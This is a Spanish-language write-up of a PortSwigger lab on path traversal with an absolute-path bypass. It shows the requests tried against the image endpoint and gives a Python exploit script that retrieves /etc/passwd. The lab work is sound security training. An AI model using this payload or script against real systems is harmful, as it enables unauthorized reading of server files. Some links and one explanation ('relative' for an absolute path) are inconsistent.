---
title: "02 File path traversal, traversal sequences blocked with absolute path bypass"
collection: publications
category: portswigger
permalink: publications/Directory Traversal/01_File path traversal, simple case
excerpt: 'Este laboratorio contiene una vulnerabilidad de recorrido de archivos en la visualización de imágenes de productos. La aplicación bloquea las secuencias transversales pero trata el nombre de archivo suministrado como relativo a un directorio de trabajo predeterminado.'
date: 2024-12-07
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'File path traversal, traversal sequences blocked with absolute path bypass'
---

![logo]({{site.url}}/images/Directory Traversal/directory-traversal-02/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Directory Traversal/directory-traversal-02/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, recuperamos el contenido del archivo `/etc/passwd`.

## Analisis

El laboratorio nos indica que la vulnerabilidad se encuentra en la visualización de imágenes de productos, vamos a probar alli.
En el endpoint `/image?filename=75.jpg `, tambien indica que las rutas se manejan desde la ruta `relativa`

![Conf1]({{site.url}}/images/Directory Traversal/directory-traversal-02/conf1.png)

Probamos regresandonos una carpetas e ingresar desde alli `../../../etc/passwd` y vemos que nos arroja error.

![Conf2]({{site.url}}/images/Directory Traversal/directory-traversal-01/conf2.png)

Ahora probamos quitando el `../` y vemos que si nos deja ingresar. Esto sucede porque esta usando la ruta relativa `/etc/passwd`.

![Conf3]({{site.url}}/images/Directory Traversal/directory-traversal-01/conf3.png)

## Aprobado

![Aprobado]({{site.url}}/images/Directory Traversal/directory-traversal-01/aprobado.png)

# Codigo Python

```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=/etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.come" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```